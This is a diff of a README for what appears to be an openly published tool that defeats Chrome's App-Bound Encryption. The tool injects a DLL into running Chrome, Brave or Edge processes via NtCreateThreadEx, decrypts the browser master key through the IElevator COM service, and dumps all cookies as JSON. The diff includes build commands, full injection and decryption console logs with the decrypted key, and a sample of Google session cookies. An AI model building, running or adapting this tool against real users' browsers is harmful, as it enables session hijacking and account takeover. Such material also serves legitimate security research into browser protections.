@@ -5,15 +5,17 @@
 
 Starting with Chrome 127, Google introduced ABE: cookies (and, in future, passwords & payment data) are encrypted with a key that can only be decrypted by the browser’s own **IElevator** COM service *and* when the calling binary is inside the browser’s installation directory.
 
-This project bypasses that path‑validation requirement by injecting a small DLL into the running browser process and calling IElevator from there, supporting multiple injection methods, verbose debugging, auto‑start, and optional process cleanup.
+This project bypasses that path‑validation requirement by injecting a small DLL into the running browser process and calling IElevator from there, supporting multiple injection methods, verbose debugging, auto‑start, and optional process cleanup and cookie extraction.
+
+<img width="929" alt="Chrome-App-Bound-Encryption-Decryption-4" src="https://github.com/user-attachments/assets/34115c99-ee93-4945-a2c1-1319b7eb1a45" />
 
 ## 📦 Supported & Tested Versions
 
 | Browser | Tested Version (x64 & ARM64) |
 |---------|-----------------------------|
-| **Google Chrome** | 135.0.7049.96 |
-| **Brave** | 1.77.100 |
-| **Microsoft Edge** | 135.0.3179.85 |
+| **Google Chrome** | 136.0.7103.93 |
+| **Brave** | 1.78.94 (136.0.7103.60) |
+| **Microsoft Edge** | 136.0.3240.50  |
 
 > [!NOTE]  
 > The injector requires the target browser to be **running** unless you use `--start-browser`.
@@ -25,7 +27,7 @@ This project bypasses that path‑validation requirement by injecting a small DL
 2. **Compile the DLL** (responsible for the decryption logic):
 
     ```bash
-    cl /EHsc /LD /O2 /MT chrome_decrypt.cpp ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
+    cl /EHsc /std:c++17 /LD /O2 /MT chrome_decrypt.cpp sqlite3.lib bcrypt.lib ole32.lib oleaut32.lib shell32.lib version.lib comsuppw.lib /link /OUT:chrome_decrypt.dll
     ```
 3. **Compile the injector** (responsible for DLL injection & console UX):
 
@@ -72,32 +74,31 @@ PS> .\chrome_inject.exe --method load --start-browser --verbose brave
 #### Normal Run
 
 ```bash
-C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption>chrome_inject.exe chrome --method nt --start-browser
+PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt
 ------------------------------------------------
-|  Chrome App-Bound Encryption Injector        |
+|  Chrome App-Bound Encryption Decryption      |
 |  Multi-Method Process Injector               |
-|  v0.4 by @xaitax                             |
+|  Full Cookie Decryption                      |
+|  v0.5 by @xaitax                             |
 ------------------------------------------------
 
 [*] Chrome not running, launching...
-[+] Chrome launched (PID=22020)
-[+] Chrome Version: 135.0.7049.96
-[*] Located Chrome with PID 22020
+[+] Chrome (v. 136.0.7103.49) launched w/ PID 18380
 [+] DLL injected via NtCreateThreadEx stealth
 [*] Starting Chrome App-Bound Encryption Decryption process.
 
 [+] COM library initialized.
 [+] IElevator instance created successfully.
 [+] Proxy blanket set successfully.
-[+] Retrieving AppData path.
 [+] Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[+] Base64 key extracted.
-[+] Finished decoding.
+[+] Finished Base64 decoding (1224 bytes).
 [+] Key header is valid.
+[+] Encrypted key blob retrieved (1220 bytes).
 [+] Encrypted key retrieved: 01000000d08c9ddf0115d1118c7a00c04fc297eb...
 [+] BSTR allocated for encrypted key.
 [+] Decryption successful.
 [+] Decrypted Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
+[*] 114 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
 [*] Chrome terminated
 ```
 
@@ -105,11 +106,12 @@ C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption>chrome_injec
 #### Verbose
 
 ```bash
-C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption>chrome_inject.exe chrome --method nt --start-browser --verbose
+PS C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption> .\chrome_inject.exe chrome --start-browser --method nt --verbose
 ------------------------------------------------
-|  Chrome App-Bound Encryption Injector        |
+|  Chrome App-Bound Encryption Decryption      |
 |  Multi-Method Process Injector               |
-|  v0.4 by @xaitax                             |
+|  Full Cookie Decryption                      |
+|  v0.5 by @xaitax                             |
 ------------------------------------------------
 
 [#] verbose=true
@@ -121,23 +123,20 @@ C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption>chrome_injec
 [#] GetProcessIdByName: snapshotting processes
 [*] Chrome not running, launching...
 [#] StartBrowserAndWait: exe=C:\Program Files\Google\Chrome\Application\chrome.exe
-[#] Browser started PID=13120
-[+] Chrome launched (PID=13120)
+[#] Browser started PID=5152
 [#] Retrieving version info
 [#] GetFileVersionInfoSizeW returned size=2212
-[+] Chrome Version: 135.0.7049.96
-[#] Version string=135.0.7049.96
-[*] Located Chrome with PID 13120
-[#] Opening process PID=13120
-[#] HandleGuard: acquired handle 208
+[+] Chrome (v. 136.0.7103.49) launched w/ PID 5152
+[#] Opening process PID=5152
+[#] HandleGuard: acquired handle 228
 [#] GetDllPath: C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption\chrome_decrypt.dll
 [#] InjectWithNtCreateThreadEx: begin
-[#] ntdll.dll base=140729278005248
-[#] NtCreateThreadEx addr=140729278012608
+[#] ntdll.dll base=140707482173440
+[#] NtCreateThreadEx addr=140707482180800
 [#] VirtualAllocEx size=87
 [#] WriteProcessMemory complete
 [#] Calling NtCreateThreadEx
-[#] NtCreateThreadEx returned 0, thr=212
+[#] NtCreateThreadEx returned 0, thr=248
 [#] InjectWithNtCreateThreadEx: done
 [+] DLL injected via NtCreateThreadEx stealth
 [*] Starting Chrome App-Bound Encryption Decryption process.
@@ -146,25 +145,50 @@ C:\Users\ah\Documents\GitHub\Chrome-App-Bound-Encryption-Decryption>chrome_injec
 [+] COM library initialized.
 [+] IElevator instance created successfully.
 [+] Proxy blanket set successfully.
-[+] Retrieving AppData path.
 [+] Local State path: C:\Users\ah\AppData\Local\Google\Chrome\User Data\Local State
-[+] Base64 key extracted.
-[+] Finished decoding.
+[+] Finished Base64 decoding (1224 bytes).
 [+] Key header is valid.
+[+] Encrypted key blob retrieved (1220 bytes).
 [+] Encrypted key retrieved: 01000000d08c9ddf0115d1118c7a00c04fc297eb...
 [+] BSTR allocated for encrypted key.
 [+] Decryption successful.
-[#] Opening key file C:\Users\ah\AppData\Local\Temp\chrome_appbound_key.txt
 [+] Decrypted Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
-[#] Key: 97fd6072e90096a6f00dc4cb7d9d6d2a7368122614a99e1cc5aa980fbdba886b
-[#] Terminating browser PID=13120
-[#] HandleGuard: acquired handle 236
+[*] 114 Cookies extracted to C:\Users\ah\AppData\Local\Temp\Chrome_decrypt_cookies.txt
+[#] Terminating browser PID=5152
+[#] HandleGuard: acquired handle 252
 [*] Chrome terminated
-[#] HandleGuard: closing handle 236
+[#] HandleGuard: closing handle 252
 [#] Exiting, success
-[#] HandleGuard: closing handle 208
+[#] HandleGuard: closing handle 228
 ```
 
+## 🍪 Cookie Extraction
+
+Once decryption completes, all cookies are emitted in JSON format into your Temp folder:
+
+- `%TEMP%\<Browser>_decrypt_cookies.txt`  
+
+Each file is a JSON array of objects:
+
+```json
+[
+  {
+    "host": "accounts.google.com",
+    "name": "ACCOUNT_CHOOSER",
+    "value": "AFx_qI781-…"
+  },
+  {
+    "host": "mail.google.com",
+    "name": "OSID",
+    "value": "g.a000uwj5ufIS…"
+  },
+  …
+]
+```
+
+## 🆕 v0.5 Changelog
+
+- **New**: Full Cookie extraction into JSON format 
 
 ## 🆕 v0.4 Changelog
 
